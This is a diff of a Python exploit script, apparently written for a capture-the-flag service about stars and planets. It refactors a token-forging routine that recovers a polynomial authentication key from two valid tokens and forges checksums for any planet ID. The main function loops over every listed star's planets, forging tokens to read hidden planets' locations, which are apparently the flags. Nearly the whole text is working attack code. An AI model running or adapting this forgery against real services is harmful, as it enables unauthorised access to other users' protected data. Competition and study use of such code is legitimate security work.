@@ -26,6 +26,10 @@ def random_string(length: int=32):
     return ''.join(random.sample(string.ascii_letters, length))
 
 
+def get_last_stars() -> Dict:
+    return requests.get(f'{URL}/api/stars/').json()
+
+
 def get_star(star_id: str) -> Dict:
     return requests.get(f'{URL}/api/stars/{star_id}').json()
 
@@ -106,47 +110,50 @@ def bytes_to_poly(x: bytes):
     return list(map(int_to_poly, map(block_to_int, split_bytes_to_blocks(x))))
 
 
-def forge_token(planet_id1: str, token1: str, token2: str, required_planet_id: str) -> str:
+def build_polynomial(data: bytes, owner: bytes, checksum: bytes):
+    length = int_to_block(8 * ((len(owner) << 64) | len(data)))
+    elements = sum(map(bytes_to_poly, [owner, data, length, checksum]), [])
+    return sum(element * X^i for i, element in enumerate(reversed(elements)))
+
+
+def get_token_generator(planet_id1: str, token1: str, token2: str):
     data1, owner1, checksum1 = parse_token(token1)
     data2, owner2, checksum2 = parse_token(token2)
 
-    length1 = int_to_block(8 * ((len(owner1) << 64) | len(data1)))
-    length2 = int_to_block(8 * ((len(owner2) << 64) | len(data2)))
+    f1 = build_polynomial(data1, owner1, checksum1)
+    f2 = build_polynomial(data2, owner2, checksum2)
 
-    elements1 = sum(map(bytes_to_poly, [owner1, data1, length1, checksum1]), [])
-    elements2 = sum(map(bytes_to_poly, [owner2, data2, length2, checksum2]), [])
+    def generate(required_planet_id: str):
+        data = xor(data1, xor(
+            f'["{md5(planet_id1)}"]'.encode(), 
+            f'["{md5(required_planet_id)}"]'.encode()))
 
-    f1 = sum(element * X^i for i, element in enumerate(reversed(elements1)))
-    f2 = sum(element * X^i for i, element in enumerate(reversed(elements2)))
+        f = build_polynomial(data, owner1, b'') * X
 
-    data = xor(data1, xor(
-        f'["{md5(planet_id1)}"]'.encode(), 
-        f'["{md5(required_planet_id)}"]'.encode()))
+        for root in (f1 + f2).roots():
+            checksum = int_to_block(poly_to_int((f + f1)(root[0])))
+            yield build_token(data, owner1, checksum)
 
-    owner = owner1
-
-    length = int_to_block(8 * ((len(owner) << 64) | len(data)))
-
-    elements = sum(map(bytes_to_poly, [owner, data, length]), [])
-
-    f = sum(element * X^(i+1) for i, element in enumerate(reversed(elements)))
-
-    for root in (f1 + f2).roots():
-        checksum = int_to_block(poly_to_int((f + f1)(root[0])))
-        yield build_token(data, owner, checksum)
+    return generate
 
 
 def main():
-    secret_token, secret_star = add_star()
-    secret_token, secret_planet = add_planet(secret_star['id'], secret_token, true)
-    
     token, star = add_star()
-    token1, planet1 = add_planet(star['id'], token)
-    token2, planet2 = add_planet(star['id'], token)
+    token1, planet1 = add_planet(star['id'], token, True)
+    token2, planet2 = add_planet(star['id'], token, True)
+    
+    generate = get_token_generator(planet1['id'], token1, token2)
 
-
-    for fake_token in forge_token(planet1['id'], token1, token2, secret_planet['id']):
-        print(get_planet(secret_planet['id'], fake_token))
+    # TODO: use attack_data
+    
+    for star in get_last_stars():
+        for planet_id in star['planets']:
+            for fake_token in generate(planet_id):
+                planet = get_planet(planet_id, fake_token)
+                if 'error' not in planet and planet['isHidden'] == True:
+                    # print(planet)
+                    print(planet['location'])
+                    break
 
 
 if __name__ == '__main__':
